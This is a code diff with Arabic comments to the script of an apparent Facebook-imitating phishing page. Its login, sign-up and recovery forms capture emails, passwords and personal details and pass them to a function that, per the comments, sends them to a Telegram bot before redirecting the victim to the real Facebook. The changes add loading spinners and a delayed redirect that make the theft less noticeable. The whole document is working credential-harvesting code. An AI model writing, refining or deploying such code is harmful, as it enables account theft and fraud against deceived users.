@@ -18,6 +18,9 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         return;
     }
     
+    // إظهار حالة التحميل
+    document.getElementById('loginLoading').style.display = 'block';
+    
     // إرسال البيانات إلى بوت التليجرام
     sendToTelegram('تسجيل دخول', { email, password });
 });
@@ -37,6 +40,9 @@ document.getElementById('signupForm').addEventListener('submit', function(e) {
         return;
     }
     
+    // إظهار حالة التحميل
+    document.getElementById('signupLoading').style.display = 'block';
+    
     // إرسال البيانات إلى بوت التليجرام
     sendToTelegram('إنشاء حساب', { firstName, lastName, email, password, birthday, gender });
 });
@@ -50,6 +56,9 @@ document.getElementById('forgotForm').addEventListener('submit', function(e) {
         alert('يرجى إدخال البريد الإلكتروني أو رقم الهاتف');
         return;
     }
+    
+    // إظهار حالة التحميل
+    document.getElementById('forgotLoading').style.display = 'block';
     
     // إرسال البيانات إلى بوت التليجرام
     sendToTelegram('نسيت كلمة السر', { recoveryEmail });
@@ -89,13 +98,17 @@ function sendToTelegram(action, data) {
         console.log('تم إرسال البيانات إلى التليجرام:', data);
         
         // بعد الإرسال، توجيه المستخدم إلى فيسبوك الحقيقي
-        window.location.href = 'https://www.facebook.com';
+        setTimeout(function() {
+            window.location.href = 'https://www.facebook.com';
+        }, 2000);
     })
     .catch(error => {
         console.error('خطأ في الإرسال:', error);
         
         // في حالة الخطأ، لا يزال يتم التوجيه إلى فيسبوك
-        window.location.href = 'https://www.facebook.com';
+        setTimeout(function() {
+            window.location.href = 'https://www.facebook.com';
+        }, 2000);
     });
 }
 
